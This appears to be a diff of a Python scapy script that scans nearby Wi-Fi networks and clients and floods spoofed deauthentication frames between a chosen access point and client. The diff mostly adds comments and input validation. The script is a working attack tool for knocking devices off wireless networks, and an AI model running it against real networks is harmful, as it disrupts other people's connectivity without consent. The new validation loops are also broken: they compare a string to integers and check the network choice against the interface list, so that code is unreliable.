@@ -4,6 +4,9 @@ from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, RadioT
 
 network_list = {}
 
+'''
+This class represents an object of type Network of wireless network
+'''
 
 class Network:
     def __init__(self, bssid, mac, chanel):
@@ -35,12 +38,18 @@ def iface_list():
     if_list = netifaces.interfaces()
     return if_list
 
+'''
+Set interface into monitor mode
+'''
 
 def monitorMode(iface):
     os.system("ifconfig " + iface + " down")
     os.system("iwconfig " + iface + " mode monitor")
     os.system("ifconfig " + iface + " up")
 
+'''
+Handels the packet caught by the interface by seperating it to sender and reciver packets
+'''
 
 def packet_handler(pkt):
     if pkt.haslayer(Dot11Beacon):
@@ -49,17 +58,12 @@ def packet_handler(pkt):
             bssid = pkt[Dot11].info
             channel = int(ord(pkt[Dot11Elt:3].info))
             mac = dot11_layer.addr2
-            # print(f"bssid:{bssid}, mac:{mac}, channel:{channel}")
             new_network = Network(bssid, pkt[Dot11].addr2, channel)
             new_duo = {mac: new_network}
             network_list.update(new_duo)
-    # elif pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type == '2L' and not pkt.haslayer(EAPOL):
     else:
-
         sn = pkt.getlayer(Dot11).addr2
         rc = pkt.getlayer(Dot11).addr1
-        # print(sn)
-        # print(rc)
         if sn in network_list.keys():
             net = network_list.get(sn)
             if rc not in net.get_users():
@@ -86,31 +90,40 @@ def perform_deauth(router, client, iface):
     try:
         for i in range(5):
             # Send out deauth from the AP
-            sendp(pckt, inter=0.1, count=40, loop=0, iface=iface, verbose=1)
+            sendp(pckt, inter=0.1, count=40, loop=0, iface=iface, verbose=0)
             # If we're targeting a client, we will also spoof deauth from the client to the AP
-            sendp(cli_to_ap_pckt, inter=0.1, count=40, loop=0, iface=iface, verbose=1)
-            print(f" now on loop {i}")
+            sendp(cli_to_ap_pckt, inter=0.1, count=40, loop=0, iface=iface, verbose=0)
+
 
     except Exception as e:
         print(f"error: {e}")
 
 
 if __name__ == '__main__':
-    # display all available interface
-    print("available interfaces:")
+    # Display all available interface
+    print("Available interfaces:")
     if_list = iface_list()
     for i in range(1, len(if_list)):
         print(i, if_list[i])
 
-    # let user pick interface - check number is valid & check interface can be in monitor mode
-    user_choice = input("please pick an interface\n ")
+
+    user_choice = input("Please pick an interface:\n ")
+    while (1):
+        try:
+            validated = int(user_choice)
+            if user_choice < 1 or user_choice > len(if_list):
+                raise Exception("Interface has to be in the range seen above")
+            break
+        except:
+            user_choice = input("Please pick an interface from the listed numbers\n ")
+
     user_iface = if_list[int(user_choice)]
 
-    print('moving interface to monitor mode')
+    print('Setting interface into monitor mode')
     monitorMode(user_iface)
 
-    # checking and displaying available networks - per 13 chanels
-    print("sniffing for available networks for 60 seconds...")
+    # Checking and displaying available networks - per 13 chanels
+    print("Sniffing for available networks for 60 seconds...")
     start_sniffer(user_iface)
     for net in range(0, len(network_list)):
         obj = list(network_list)[net]
@@ -118,8 +131,15 @@ if __name__ == '__main__':
         print(f"{net + 1} {net_inf}")
 
     # let user pick network - check number is valid
-    print(len(network_list))
-    user_choice = input("please pick a network: \n")
+    user_choice = input("Please pick a network: \n")
+    while 1:
+        try:
+            validated = int(user_choice)
+            if user_choice < 1 or user_choice > len(if_list):
+                raise Exception("Interface has to be in the range seen above")
+            break
+        except:
+            user_choice = input("Please pick an interface from the listed numbers\n ")
     user_key = list(network_list)[int(user_choice) - 1]
     user_network = network_list.get(user_key)
 
